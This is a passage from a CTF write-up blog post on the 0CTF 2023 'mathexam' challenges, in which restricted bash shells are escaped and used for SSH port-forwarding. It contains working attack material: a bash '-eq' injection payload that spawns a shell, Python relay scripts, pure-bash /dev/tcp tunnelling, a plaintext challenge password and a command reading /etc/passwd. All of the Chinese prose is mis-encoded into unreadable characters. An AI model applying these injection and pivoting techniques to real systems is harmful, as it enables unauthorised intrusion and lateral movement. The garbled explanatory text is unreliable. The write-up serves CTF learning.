    </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span>
<span class="k">fi
done</span> | xxd <span class="o">&gt;</span> result
</code></pre></div></div>
<p>ä½†è¿™æ ·åˆå‘ç°äº†æ–°çš„ä¸€äº›é—®é¢˜ï¼š</p>
<ol>
  <li>printf å’Œ echo çš„è¾“å‡ºåœ¨å¤„ç†æŸäº›å†…å®¹æ—¶è¿˜æ˜¯ä¼šä¸ä¸€è‡´ã€‚</li>
  <li>read åœ¨å¤„ç†æŸäº›å­—ç¬¦ä¸²æ—¶ä¼šåæ‰ä¸€éƒ¨åˆ† \x00ã€‚æ¯”å¦‚ï¼šå½“è¾“å…¥å­—ç¬¦ä¸²æœ‰ 3 ä¸ª \x00 ç›¸é‚»æ—¶ï¼Œä¼šè¢«åæ‰ä¸€ä¸ªã€‚
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nb">echo</span> <span class="nt">-en</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">00"</span>
</code></pre></div>    </div>
    <p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231211060804.png" alt="20231211060804" /></p>
  </li>
</ol>

<p>ä¸ç®¡æ˜¯ä½¿ç”¨ printf è¿˜æ˜¯ echo, ç»“æœéƒ½æ˜¯ä¸€æ ·çš„ï¼Œç›´æ¥è°ƒè¯• bash ä¹Ÿèƒ½å‘ç°æ˜¯ read çš„é—®é¢˜ã€‚</p>

<p>emmmï¼Œå®åœ¨æ˜¯å¾ˆéš¾æ„é€ å‡ºå®Œå…¨ç›¸åŒçš„æ•°æ®ã€‚ç¡¬ç€å¤´çš®è¯•çš„æ—¶å€™çªç„¶å‘ç°ï¼Œprintf %c è¾“å‡ºçš„æ•°æ®æ˜¯å¯ä»¥æ­£å¸¸ç”¨äº ssh é€šä¿¡ï¼Œä½† echo -ne è¾“å‡ºçš„æ•°æ®ä¼šå¯¼è‡´ ssh å¡ä½ã€‚ã€‚ã€‚ã€‚</p>

<p>ç”±æ­¤å¯ä»¥åœ¨ exp2.py çš„åŸºç¡€ä¸Šè¿›è¡Œä¿®æ”¹ï¼ˆä»…æ ‡æ˜äº†ä¿®æ”¹éƒ¨åˆ†ï¼‰å¾—åˆ° exp3.py</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># å‘½ä»¤å’Œå‚æ•°
</span><span class="n">command</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">ssh</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">ctf@127.0.0.1</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">-p</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">4444</span><span class="sh">"</span><span class="p">]</span>
<span class="bp">...</span>

<span class="n">listen_port</span> <span class="o">=</span> <span class="mi">5555</span>

<span class="bp">...</span>

<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">exec 3&lt;&gt;/dev/tcp/fourth/22</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span> <span class="c1">#exec 3&lt;&gt;/dev/tcp/fourth/22
</span><span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">'''</span><span class="s">while IFS= read -r -d </span><span class="sh">''</span><span class="s"> -u 3 -n 1 byte ; do printf </span><span class="sh">"</span><span class="s">%c</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="s">$byte</span><span class="sh">"</span><span class="s">; done &amp;</span><span class="se">\n</span><span class="sh">'''</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>
<span class="bp">...</span>

<span class="k">def</span> <span class="nf">trans</span><span class="p">(</span><span class="n">bytess</span><span class="p">):</span>
    <span class="n">out</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">hex_string</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="nf">hexlify</span><span class="p">(</span><span class="n">bytess</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">hex_string</span><span class="p">)):</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">out</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="sh">'</span><span class="se">\\</span><span class="s">x</span><span class="sh">'</span><span class="o">+</span><span class="n">hex_string</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">])</span>
    <span class="n">connect_cmd</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'''</span><span class="s">echo -ne </span><span class="sh">"</span><span class="si">{</span><span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">out</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="s"> &gt;&amp;3 &amp; </span><span class="se">\n</span><span class="sh">'''</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">connect_cmd</span><span class="p">)</span>
    <span class="c1"># os.system(connect_cmd)
</span>    <span class="k">return</span> <span class="n">connect_cmd</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>

    <span class="bp">...</span>

<span class="k">def</span> <span class="nf">socket_write_output</span><span class="p">(</span><span class="n">process</span><span class="p">):</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="bp">...</span>
                <span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nf">trans</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
            <span class="bp">...</span>
</code></pre></div></div>
<p>ä¾æ¬¡è¿è¡Œ exp.py ~ exp3.py</p>

<p>ç„¶åå°±å¯ä»¥é€šè¿‡ 5555 ç«¯å£è¿æ¥ä¸Š fourth äº†ã€‚è¿›å»ä¹‹åæ²¡æœ‰ catã€å¯ä»¥ä½¿ç”¨ <code class="language-plaintext highlighter-rouge">exec &lt;/flag4</code> è¯»å– flagã€‚</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231211080409.png" alt="20231211080409" /></p>

<p>æ€»ç»“ï¼šç”±äºå—åˆ° read çš„å½±å“ï¼Œprintf å’Œ echo éƒ½æ²¡æ³•å®Œå…¨è¿˜åŸäºŒè¿›åˆ¶æ–‡ä»¶çš„å†…å®¹ï¼Œä½† printf %c å¯ä»¥æ­£å¸¸ç”¨äº ssh é€šä¿¡ï¼Œä½† echo -ne ä¸è¡Œï¼Œè¿˜å¾—æ ¹æ®å…·ä½“åè®®åˆ†æï¼Œæ·»åŠ æ›´å¤šçš„å­—ç¬¦ä¸²è½¬æ¢æ‰èƒ½å¤Ÿæé«˜å…¼å®¹æ€§ã€‚</p>

<p>åè¯ï¼Œbash åŸç”Ÿå‘½ä»¤ä¸‹ï¼Œå¦‚ä½•å®Œæ•´è·å–äºŒè¿›åˆ¶æ–‡ä»¶çš„å†…å®¹å‘¢ï¼Ÿæˆ‘æ‰¾åˆ°äº† stackexchange ä¸Šçš„ä¸€ä¸ªè§£ç­”ï¼š<a href="https://unix.stackexchange.com/questions/347390/bash-cant-store-hexvalue-0x00-in-variable">linux - bash canâ€™t store hexvalue 0x00 in variable - Unix &amp; Linux Stack Exchange</a></p>

<p>åˆ©ç”¨ readarray å¯ä»¥å°†å¸¦æœ‰ç‰¹æ®Šå­—ç¬¦çš„å†…å®¹å­˜åœ¨æ•°ç»„ä¸­ï¼Œç„¶åå†æ‹¼æ¥è¾“å‡ºã€‚è¿™ç§æ–¹å¼å¯ä»¥å®Œæ•´è·å–ä»»æ„æ–‡ä»¶çš„å®Œæ•´å†…å®¹ï¼Œå³ä½¿æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>readarray <span class="nt">-d</span> <span class="s1">$'</span><span class="se">\0</span><span class="s1">'</span> zArray &lt;/etc/passwd
<span class="o">[[</span> <span class="s2">"</span><span class="k">${</span><span class="nv">zArray</span><span class="p">[*]</span><span class="k">}</span><span class="s2">"</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nb">printf</span> <span class="s1">'%s\0'</span> <span class="s2">"</span><span class="k">${</span><span class="nv">zArray</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span>
</code></pre></div></div>
<p>ä½†åœ¨è¿™é“é¢˜çš„åœºæ™¯ä¸‹ï¼Œreadarray ä¸å¤ªå¥½ç”¨ï¼Œå¦‚æœç”¨æ¥è¯»å–è¿æ¥ä¸­çš„ fd çš„è¯ï¼Œreadarray ä¼šè¢«é˜»å¡ä½ï¼Œå¯¼è‡´ zArray æ— æ³•è¢«èµ‹å€¼ï¼Œåé¢çš„ printf ä¹Ÿå°±è¯»ä¸å‡ºå†…å®¹ã€‚</p>

<h2 id="è¡¥å……">è¡¥å……ï¼š</h2>
<p>å‚è€ƒäº†å…¶ä»–å¤§ä½¬çš„ writeupï¼š</p>
<ul>
  <li><a href="https://github.com/mephi42/ctf/blob/43222e15e7cb74844b2c686c4f32cccf74e7909f/2023.12.09-0CTF_TCTF_2023/mathexam%20-%204/script">ctf/2023.12.09-0CTF_TCTF_2023/mathexam - 4/script at 43222e15e7cb74844b2c686c4f32cccf74e7909f Â· mephi42/ctf</a></li>
</ul>

<p>writeup ä½œè€…é¢å¤–è®¾ç½®äº† LC_ALL ç¯å¢ƒå˜é‡ä¸º Cã€‚</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">LC_ALL</span><span class="o">=</span>C
</code></pre></div></div>

<p>LC_ALL ç¯å¢ƒå˜é‡ç”¨äºè¦†ç›–æ‰€æœ‰å…¶ä»–æœ¬åœ°åŒ–è®¾ç½®ï¼Œå®ƒé€šå¸¸ç”¨äºç¡®ä¿åœ¨ç‰¹å®šç¨‹åºè¿è¡Œæ—¶ä½¿ç”¨ç‰¹å®šçš„è¯­è¨€ç¯å¢ƒã€‚C è¯­è¨€ç¯å¢ƒæ˜¯æœ€ç®€å•çš„è¯­è¨€ç¯å¢ƒï¼Œå…¶ä¸­å­—ç¬¦æ˜¯å•å­—èŠ‚çš„ï¼Œå­—ç¬¦é›†æ˜¯ ASCIIï¼Œæ’åºé¡ºåºåŸºäºå­—èŠ‚å€¼ã€‚</p>

<p>åŠ å…¥è¯¥ç¯å¢ƒå˜é‡ä¹‹åï¼Œread å°±ä¸ä¼šå°†å¤šä¸ªå­—ç¬¦è§£ææˆä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œä»è€Œè§£å†³ä¸Šé¢ \x00 ç¼ºå¤±çš„é—®é¢˜ï¼Œæµ‹è¯•è„šæœ¬å¦‚ä¸‹ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nb">echo</span> <span class="nt">-en</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">00"</span> | xxd

<span class="nb">echo</span> <span class="nt">-en</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">00"</span> | <span class="k">while </span><span class="nv">LC_ALL</span><span class="o">=</span>C <span class="nv">IFS</span><span class="o">=</span> <span class="nb">read</span> <span class="nt">-r</span> <span class="nt">-d</span> <span class="s1">$'</span><span class="se">\0</span><span class="s1">'</span> <span class="nt">-n</span> 1 line<span class="p">;</span>
<span class="k">do 
</span><span class="nb">printf</span> <span class="s2">"%c"</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span>
<span class="k">done</span> | xxd


<span class="nb">echo</span> <span class="nt">-en</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">00"</span> | <span class="k">while </span><span class="nv">LC_ALL</span><span class="o">=</span>C <span class="nv">IFS</span><span class="o">=</span> <span class="nb">read</span> <span class="nt">-r</span> <span class="nt">-d</span> <span class="s1">$'</span><span class="se">\0</span><span class="s1">'</span> <span class="nt">-n</span> 1 line<span class="p">;</span>
<span class="k">do 
if</span> <span class="o">[[</span> <span class="nt">-z</span> <span class="nv">$line</span> <span class="o">]]</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span>
<span class="k">else
    </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span>
<span class="k">fi
done</span> | xxd
</code></pre></div></div>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231211201433.png" alt="20231211201433" /></p>

<p>ä½¿ç”¨äºŒè¿›åˆ¶æ–‡ä»¶æ¥æµ‹è¯•ä¹Ÿå¯ä»¥å®Œå…¨ä¸€è‡´ï¼Œå¯ä»¥è¯´å…·å¤‡é€šç”¨æ€§äº†ï¼</p>

<h1 id="å‚è€ƒ">å‚è€ƒ</h1>
<ul>
  <li><a href="https://0xdf.gitlab.io/2023/05/13/htb-interface.html">HTB: Interface - 0xdf hacks stuff</a></li>
  <li><a href="https://dev.to/greymd/eq-can-be-critically-vulnerable-338m">Arithmetic operation in shell script can be exploited - DEV Community</a></li>
  <li><a href="https://unix.stackexchange.com/questions/347390/bash-cant-store-hexvalue-0x00-in-variable">linux - bash canâ€™t store hexvalue 0x00 in variable - Unix &amp; Linux Stack Exchange</a></li>
  <li><a href="https://github.com/mephi42/ctf/blob/43222e15e7cb74844b2c686c4f32cccf74e7909f/2023.12.09-0CTF_TCTF_2023/mathexam%20-%204/script">ctf/2023.12.09-0CTF_TCTF_2023/mathexam - 4/script at 43222e15e7cb74844b2c686c4f32cccf74e7909f Â· mephi42/ctf</a></li>
</ul>]]></content><author><name>DumKiy</name></author><category term="CTF" /><category term="bash" /><category term="ssh" /><category term="tunnel" /><category term="0ctf 2023" /><summary type="html"><![CDATA[0CTF Mathexam Writeup mathexam ç³»åˆ—éå¸¸æœ‰æ„æ€ï¼Œä¸»è¦è€ƒå¯Ÿå¦‚ä½•åœ¨å—é™çš„ bash ä¸‹å®Œæˆç«¯å£è½¬å‘ï¼Œé¢˜ç›®çš„åœºæ™¯å¯ä»¥é€‚ç”¨åˆ°ä¸€äº›å°è®¾å¤‡çš„æ¸—é€ä¸­ã€‚åˆ©ç”¨æ€è·¯æ€»ç»“å¦‚ä¸‹ï¼š mathexam-1ï¼šbash -eq æ³¨å…¥ mathexam-2ï¼šåˆ©ç”¨ busybox nc å®Œæˆç«¯å£è½¬å‘ã€‚ mathexam-3ï¼šå»æ‰äº† buxyboxï¼Œåˆ©ç”¨ cat å®Œæˆç«¯å£è½¬å‘ã€‚ mathexam-4ï¼šè¿›ä¸€æ­¥å»æ‰äº† catï¼Œéœ€è¦åˆ©ç”¨çº¯ç²¹çš„ bash å®Œæˆç«¯å£è½¬å‘ã€‚ mathexam-1 The math exam starts now. Participate with integrity and never cheat. Someone has stolen the exam paper, and definitely he got full marks. Fortunately, he didnâ€™t find the flag. #!/bin/bash echo "You are now in the math examination hall." echo "First, please read exam integrity statement:" echo "" promisetext="I promise to play fairly and not to cheat. In case of violation, I voluntarily accept punishment" echo "$promisetext" echo "" echo "Now, write down the exam integrity statement here:" read userinput if [ "$userinput" = "$promisetext" ] then echo "All right" else echo "Error" exit fi echo "" echo "Exam starts" echo "(notice: numbers in dec, oct or hex format are all accepted)" echo "" correctcount=0 for i in {1..100} do echo "Problem $i of 100:" echo "$i + $i = ?" ans=$(($i+$i)) read line if [[ "$line" -eq "$ans" ]] then correctcount="$(($correctcount+1))" fi echo "" done echo "Exam finishes" echo "You score is: $correctcount" exit é¢˜ç›®ç»™äº†ä¸€ä¸ª bash è„šæœ¬ï¼Œè·å–ç”¨æˆ·è¾“å…¥å¹¶ä½¿ç”¨ -eq è¿›è¡Œäº†æ¯”è¾ƒã€‚bash è„šæœ¬ä¸­è¿™æ ·çš„è¯­å¥æ˜¯å¯ä»¥æ³¨å…¥çš„ï¼š[[ "$VAR" -eq "something" ]]ï¼Œå…·ä½“å¯å‚è€ƒæ–‡ç« ï¼šArithmetic operation in shell script can be exploited - DEV Community æ³¨å…¥ pocï¼š x[$(command)] æµ‹è¯•å‘½ä»¤æ—¶å¯ä»¥å‘ç°é¢˜ç›®ä¼šå°†é”™è¯¯è¾“å‡ºå‡ºæ¥ï¼Œä½†æ˜¯æ ‡å‡†è¾“å‡ºçœ‹ä¸åˆ°ï¼Œå› æ­¤æˆ‘ä»¬å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°é”™è¯¯è¾“å‡ºã€‚å¦å¤–ç›®æ ‡ç¯å¢ƒæœ‰ busyboxï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ payload æ‰“å¼€äº¤äº’å¼ shellï¼Œå°±å¯ä»¥æ‹¿åˆ° flag1ã€‚ x[$(/bin/busybox sh 1&gt;&amp;2)] mathexam-2 æ‹¿åˆ°ç¬¬ä¸€å…³ shell åï¼Œå¯ä»¥åœ¨æ ¹ç›®å½•ä¸­æ‰¾åˆ°ä¸€ä¸ª .connect.sh.swp æ–‡ä»¶ï¼Œè·å–è¯¥æ–‡ä»¶çš„å†…å®¹å¯çŸ¥ second ä¸»æœºçš„ç”¨æˆ·åå¯†ç ä¸º ctf:x5kdkwjr8exi2bf70y8g80bggd2nuepfã€‚ è·å–ç¬¬äºŒå…³çš„ flag è¦æ±‚æˆ‘ä»¬ ssh ç™»é™†åˆ° second ä¸»æœºä¸­ï¼Œä½†ç›®æ ‡ç¯å¢ƒè®¾ç½®äº†è¯¸å¤šé™åˆ¶ï¼š æ²¡æœ‰ ssh ä»…æœ‰çš„äºŒè¿›åˆ¶æ–‡ä»¶éƒ½åœ¨ /bin ç›®å½•ä¸‹ drwxr-xr-x 1 0 0 4096 Dec 10 00:11 . drwxr-xr-x 1 0 0 4096 Dec 10 00:11 .. -rwxr-xr-x 1 0 0 1396520 Dec 9 18:44 bash -rwxr-xr-x 1 0 0 2193264 Dec 10 00:11 busybox -rwxr-xr-x 1 0 0 35280 Dec 10 00:11 cat -rwxr-xr-x 1 0 0 138208 Dec 10 00:11 ls lrwxrwxrwx 1 0 0 4 Dec 9 18:44 sh -&gt; bash å½“å‰ç”¨æˆ·å¯¹æ‰€æœ‰æ–‡ä»¶éƒ½æ²¡æœ‰å†™æƒé™ã€‚ ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦åˆ©ç”¨ busyboxã€bashã€cat æ¥åšç«¯å£è½¬å‘ï¼Œå…·ä½“æ€è·¯å¦‚ä¸‹ï¼š é€šè¿‡ busybox nc è¿æ¥åˆ° secondã€‚æ­¤æ—¶ busybox nc ä¸ ssh æœåŠ¡å»ºç«‹èµ·äº† TCP è¿æ¥ã€‚ busybox nc second 22 æˆ‘ä»¬åªéœ€è¦åœ¨è¯¥è¿æ¥ä¸­æ”¶å‘æ•°æ®å³å¯å®Œæˆ ssh è®¤è¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ python ä¸­çš„ subprocess æ¨¡å—æ¥æ§åˆ¶ç»ˆç«¯æ•°æ®çš„æ”¶å‘ï¼Œä»¥æ­¤æ¥å®ç°ç«¯å£è½¬å‘ã€‚ ç¼–å†™è„šæœ¬å¦‚ä¸‹ã€‚ import subprocess import threading import select,os,time # å‘½ä»¤å’Œå‚æ•° command = ["nc", "-X", "connect", "-x", "instance.0ctf2023.ctf.0ops.sjtu.cn:18081", "kctgxr4bjb6kgj26", "1"] # å¯åŠ¨è¿›ç¨‹ process = subprocess.Popen( command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=0 # è®¾ç½®ä¸º 0 ä»¥å…³é—­ç¼“å†² ) thread_close = 0 def read_output(process): while True: if thread_close==1: break # æ£€æŸ¥æ˜¯å¦æœ‰æ•°æ®å¯è¯» reads, _, _ = select.select([process.stdout], [], [], 0.1) if reads: # è·å–æ–‡ä»¶æè¿°ç¬¦ fd = process.stdout.fileno() # è¯»å–å¯ç”¨çš„æ•°æ® output = os.read(fd, 4096) # è¯»å–æœ€å¤š 4096 å­—èŠ‚ if output: print(output.decode(), end='') # åˆ›å»ºå¹¶å¯åŠ¨çº¿ç¨‹ thread = threading.Thread(target=read_output, args=(process,)) thread.start() # å‘é€å‘½ä»¤ process.stdin.write(b"I promise to play fairly and not to cheat. In case of violation, I voluntarily accept punishment\n") process.stdin.flush() time.sleep(1) process.stdin.write(b"x[$(/bin/busybox sh 1&gt;&amp;2)] \n") process.stdin.flush() process.stdin.write(b"busybox ping -c 1 second\n") process.stdin.flush() #ç›‘å¬ç«¯å£ï¼Œå»ºç«‹é€šé“ import socket # è®¾ç½®ç›‘å¬ç«¯å£ listen_port = 3333 # åˆ›å»º socket å¯¹è±¡ server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) server_socket.bind(('0.0.0.0', listen_port)) server_socket.listen(1) print(f"Listening on port {listen_port}...") # æ¥å—ä¸€ä¸ªè¿æ¥ client_socket, addr = server_socket.accept() print(f"Connection from {addr} established.") thread_close=1 # ç­‰å¾…çº¿ç¨‹ç»“æŸ thread.join() process.stdin.write(b"busybox nc second 22\n") process.stdin.flush() def socket_read_output(process): while True: # æ£€æŸ¥ process.stdout æ˜¯å¦æœ‰æ•°æ®å¯è¯» reads, _, _ = select.select([process.stdout, client_socket], [], [], 0.1) # å¦‚æœ process.stdout æœ‰æ•°æ®å¯è¯»ï¼Œåˆ™å°†æ•°æ®å‘é€åˆ°å®¢æˆ·ç«¯ if process.stdout in reads: fd = process.stdout.fileno() output = os.read(fd, 4096) if output: client_socket.sendall(output) def socket_write_output(process): while True: # ä½¿ç”¨ select ç›‘æµ‹å®¢æˆ·ç«¯ socket æ˜¯å¦æœ‰æ•°æ®å¯è¯» reads, _, _ = select.select([client_socket], [], [], 0.1) # å¦‚æœå®¢æˆ·ç«¯æœ‰æ•°æ®å¯è¯»ï¼Œåˆ™å°†æ•°æ®å‘é€åˆ° process.stdin if client_socket in reads: data = client_socket.recv(4096) if data: process.stdin.write(data) process.stdin.flush() thread1 = threading.Thread(target=socket_read_output, args=(process,)) thread1.start() thread2 = threading.Thread(target=socket_write_output, args=(process,)) thread2.start() thread1.join() thread2.join() client_socket.close() server_socket.close() print("Connection closed.") exit(0) æ‰§è¡Œè¯¥è„šæœ¬åï¼Œä¼šå°†æœ¬åœ°çš„ 3333 ç«¯å£è½¬å‘åˆ° second çš„ 22 ç«¯å£ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è¿æ¥åˆ° second äº†ã€‚ mathexam-3 è¿æ¥åˆ° second åï¼Œflag æ–‡ä»¶ä¸­ä¼šæç¤ºç¬¬ä¸‰å…³çš„ flag åœ¨ third ä¸»æœºä¸Šï¼Œç”¨æˆ·åå¯†ç ä¸å˜ï¼Œæˆ‘ä»¬éœ€è¦å†æ„å»ºä¸€å±‚ä»£ç†ã€‚ä¸åŒåœ¨ä¸ second ä¸»æœºä¸­å°† busybox ç§»é™¤äº†ã€‚ æ²¡æœ‰ nc çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥ä½¿ç”¨ exec æˆ–è€… cat è¿æ¥åˆ°è¿œç¨‹ç«¯å£ï¼Œå‚è€ƒï¼š Some useful tips about /dev/tcp | Andrea Fortuna æ¯”å¦‚ï¼š cat &lt;/dev/tcp/time.nist.gov/13 æˆ–è€…ä½¿ç”¨ exec å°† tcp è¿æ¥ç»‘å®šåˆ°æè¿°ç¬¦ 3,ç„¶åé€šè¿‡ echo æˆ–è€… cat æ”¶å‘æ•°æ®ã€‚ exec 3&lt;&gt;/dev/tcp/www.google.com/80 echo -e "GET / HTTP/1.1\r\nhost: http://www.google.com\r\nConnection: close\r\n\r\n" &gt;&amp;3 cat &lt;&amp;3 æ ¹æ®è¿™ä¸ªåŸç†ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„å»ºå‡ºä¸€ä¸ªç±»ä¼¼çš„æ”¶å‘çª—å£ï¼š exec 3&lt;&gt;/dev/tcp/third/22 cat &lt;&amp;3 &amp; cat &gt;&amp;3 å‰ä¸¤è¡Œä»£ç å¯ä»¥æ›¿ä»£ busybox nc third 22ï¼Œåˆ©ç”¨ &amp; å¯ä»¥å°†è¯»å–è¿œç¨‹æ¶ˆæ¯çš„ä»»åŠ¡æ”¾åœ¨åå°ï¼Œä¸€æ—¦æ¥æ”¶åˆ°æ•°æ®ï¼Œå°±å¯ä»¥ç›´æ¥æ‰“å°åœ¨æ ‡å‡†è¾“å‡ºä¸­ã€‚ cat &gt;&amp;3 ä¼šç­‰å¾…ç”¨æˆ·çš„è¾“å…¥ï¼Œç”¨æˆ·è¾“å…¥ä¹‹åä¼šé‡å®šå‘åˆ°æè¿°ç¬¦ 3 ä¸­ï¼Œpython è„šæœ¬ä¸­å°±å¯ä»¥ç›´æ¥ç”¨ process.stdin.write å‘æ•°æ®å°±å¯ä»¥äº†ã€‚ åˆ©ç”¨è„šæœ¬ä¸ä¸Šä¸€å…³çš„ç±»ä¼¼ï¼Œåœ¨æ­¤å‰çš„è„šæœ¬ä¸­åšä¿®æ”¹å³å¯ï¼Œéœ€è¦æ³¨æ„çš„å°±æ˜¯éœ€è¦åœ¨æ”¶å‘å‰ï¼Œå…ˆæ‰§è¡Œä¸Šé¢æ„é€ çš„ payloadã€‚ exp2.py import subprocess import threading import select,os,time import binascii # å‘½ä»¤å’Œå‚æ•° command = ["ssh", "ctf@127.0.0.1","-p","3333"] ... # åˆ›å»ºå¹¶å¯åŠ¨çº¿ç¨‹ thread = threading.Thread(target=read_output, args=(process,)) thread.start() time.sleep(5) #æ‰‹åŠ¨è¾“å…¥å¯†ç  x5kdkwjr8exi2bf70y8g80bggd2nuepf process.stdin.write(b"whoami\n") process.stdin.flush() ... listen_port = 4444 ... process.stdin.write(b"exec 3&lt;&gt;/dev/tcp/third/22\n") process.stdin.write(b'cat &lt;&amp;3 &amp; \n') process.stdin.write(b"cat &gt;&amp;3\n") ... åˆ©ç”¨æ—¶å…ˆè¿è¡Œ exp.pyï¼Œç„¶åè¿è¡Œ exp2.pyã€‚æ­¤æ—¶å¯ä»¥é€šè¿‡æœ¬åœ° 4444 ç«¯å£ç™»é™† thirdã€‚ mathexam-4 è¿›å…¥äº† third ä¸»æœºåå¯ä»¥å‘ç°è¿™ä¸€å…³å°† cat ä¹Ÿå»æ‰äº†ï¼Œæ‰€ä»¥æ€è·¯ä¹Ÿæ¯”è¾ƒæ˜ç¡®ï¼Œå°±æ˜¯ä½¿ç”¨çº¯ç²¹çš„ bash å†…ç½®å‘½ä»¤æ¥è¾¾åˆ° cat ç›¸åŒçš„æ•ˆæœã€‚ bash ç›¸å…³å‘½ä»¤çš„ä½¿ç”¨å¯ä»¥å‚è€ƒï¼š Linux Bash Shell Scripting Tutorial Wiki å…¶ä¸­å°±æåˆ°äº†ä¸€äº›è¯»å†™æ–‡ä»¶æè¿°ç¬¦çš„æ–¹æ³•ï¼šreadã€echoã€printfã€‚æ¯”å¦‚æ–‡ä»¶å†™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ echo -ne æ¥å†™äºŒè¿›åˆ¶æ•°æ®ã€‚ echo -ne "\xf0\x00\x00\x00\x12\x00" &gt;&amp;3 è¿™æ ·å°±å¯ä»¥æ›¿ä»£ cat æ¥å†™æ•°æ®ï¼š cat &gt;&amp;3 è¯»å–æ•°æ®å¯ä»¥ä½¿ç”¨ read æ¥ä»£æ›¿ï¼Œread å¯ä»¥ä½¿ç”¨ -u å‚æ•°æŒ‡å®šæ–‡ä»¶æè¿°ç¬¦ï¼Œé€è¡Œè·å–å†…å®¹åä½¿ç”¨ echo è¾“å‡ºåˆ°ç»ˆç«¯ã€‚ while read -u 3 -r line;do echo -ne "$line\n";done ä½†æµ‹è¯•çš„æ—¶å€™ä¼šå‘ç°ç»è¿‡ read å¤„ç†çš„æ•°æ®å‘ç”Ÿäº†å˜åŒ–ï¼Œæ‰€æœ‰çš„ \x00 éƒ½è¢«åæ‰äº†ã€‚ #!/bin/bash echo -e "1123\x80\x00\x01\x80" | xxd echo -e "1123\x80\x00\x01\x80" | while read -r line; do echo -ne "$line\n" ; done | xxd read è¯»å–åˆ° \x00 